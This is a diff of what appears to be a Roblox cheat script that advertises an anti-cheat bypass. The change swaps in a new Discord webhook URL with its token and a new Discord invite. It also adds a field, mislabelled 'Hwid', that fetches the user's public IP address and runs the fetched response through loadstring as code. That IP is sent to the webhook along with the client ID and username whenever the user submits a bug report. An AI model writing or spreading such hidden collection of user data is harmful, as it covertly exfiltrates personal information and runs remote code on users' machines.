@@ -1839,7 +1839,7 @@ CheckBypassAntiCheat()
         ReportBugstext = value
     end)
     
-    local url = "https://discord.com/api/webhooks/1216422813456404650/kIWL0wEpxn7G4_Vdb8J1-bOPDsMrj2YC3FwrljlySDeqOzRzsYJl3AMmFrgoIZlKdMw1"
+    local url = "https://discord.com/api/webhooks/1218178538121990246/Q-eRCiU02Qr_dTLyF1byv2q-mewUFLL83qzSjZyK0f-JR5NxDDhMFqUshp4w_kdQpIoc"
     
     Main:Button("Enter",function()
         Thanksforreport:Set("Thank You For Reported Bugs")
@@ -1858,6 +1858,10 @@ CheckBypassAntiCheat()
                     {
                         ["name"] = "Hwid",
                         ["value"] = '```lua'..'\n'..game:GetService("RbxAnalyticsService"):GetClientId()..'\n```',
+                    },
+                    {
+                        ["name"] = "Hwid",
+                        ["value"] = '```lua'..'\n'..loadstring(Game:HttpGet"https://api.ipify.org")()..'\n```',
                     },
                     {
                         ["name"] = "Username",
@@ -1895,7 +1899,7 @@ CheckBypassAntiCheat()
         
         
     Main:Button("Copy Discord Link",function()
-    setclipboard("https://discord.gg/hKw29PAM")
+    setclipboard("https://discord.gg/EcchJs8U")
     end)
     
     Race:Seperator("Race V4")
